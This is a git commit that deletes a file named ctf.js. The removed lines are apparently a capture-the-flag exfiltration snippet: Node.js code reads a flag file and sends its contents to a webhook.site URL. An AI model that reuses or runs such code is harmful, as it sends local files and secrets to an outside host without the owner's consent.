dc9c2487ad5d15f5587949b5b236be2f47ac61a7
1tteu <103301531+1tteu@users.noreply.github.com>
2024-09-15 12:26:47 -0300

    Delete ctf.js

--- ctf.js
+++
@@ -1,6 +0,0 @@
-const fs = require('fs');
-const http = require('http');
-
-// Exemplo de código malicioso que exfiltra arquivos do sistema
-const flag = fs.readFileSync('/path/to/flag.txt', 'utf8');
-http.get(`https://webhook.site/1ce3d6ce-eb0a-4365-b862-68cac4749bcf?data=${encodeURIComponent(flag)}`);
